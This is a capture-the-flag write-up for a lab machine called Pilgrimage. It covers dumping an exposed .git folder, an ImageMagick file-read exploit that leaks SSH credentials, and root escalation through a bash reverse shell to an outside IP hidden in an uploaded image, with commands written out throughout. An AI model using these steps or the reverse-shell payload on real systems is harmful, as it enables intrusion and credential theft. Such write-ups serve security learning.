We run rustscan in order to enumerate the ports:

    rustscan -a 10.10.11.219

output:

    Open 10.10.11.219:22
    Open 10.10.11.219:80

we add the target machine at the /etc/hosts with the following command:

    sudo su
    echo "10.10.11.219    pilgrimage.htb" >> /etc/hosts

let's go on doing an enumeration of directory and vhosts by using feroxbuster:

    sudo feroxbuster -u http://pilgrimage.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt,json,docx,pdf,js,html,git,bak -t 150 -d 2

output:

    200      GET      198l      494w     7621c http://pilgrimage.htb/
    301      GET        7l       11w      169c http://pilgrimage.htb/assets => http://pilgrimage.htb/assets/
    301      GET        7l       11w      169c http://pilgrimage.htb/.git => http://pilgrimage.htb/.git/
    301      GET        7l       11w      169c http://pilgrimage.htb/assets/images => http://pilgrimage.htb/assets/images/
    200      GET       16l       58w     5158c http://pilgrimage.htb/.git/index

it's very interesting the .git folder, we must dump it, a very helpful tool can be gitdumper.py

    python3 gitdumper.py http://pilgrimage.htb/.git/ 

it contains the backend of the server and alongside aan elf called magik, by doing some researches it's the ImageMagick software, that it'used to modify an image.
Reading the sourcecode leads to us, in the first option to try a revshell because inside the code. there is a php function called exec(), that it executes bash command by it'doesnt't work, the second option it was to doing some researches on internet and the most valuable link it was this:

	https://github.com/Sybil-Scan/imagemagick-lfi-poc

with the following command:

	python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
	/upload on the website, open and download the image/
	python3 generate.py -f "/etc/passwd" -o exploit.png
	indentify -verbose result.png

Now inside the result.png there are hexdecimale values, there is the db itself holding the emily's credentials of the SSH,.
Time to connect it:

	python3 -m pwncat
	connect ssh://emily:redatcted:10.10.11.219

Boom, we're inside and we can submit the user flag.
Inside /home/emily folder there was a static binaries called "  " that if yout run it, it will show you every active processes, one caught my attention a malwarescan.sh, run by root and in short terms it used binwalk to check for malicious code inside the images uploaded by users.
I had an idea to create a fake exploit.png, with magic bytes same as a.png but with inside a revshell.

here the payload:

	/bin/bash -i >& /dev/tcp/10.9.59.103/6666 0>&1

we run the listener:

	python3 -m pwncat
	connect -lp 6666

we upload the image with the previous shell(aka SSH login):

	upload  YOUR PATH/exploit.png  /var/www/pilgrimage.htb/shrink/exploit.png

Sbam, if you check on the second pwncat shell we're the root and we can submit the root flag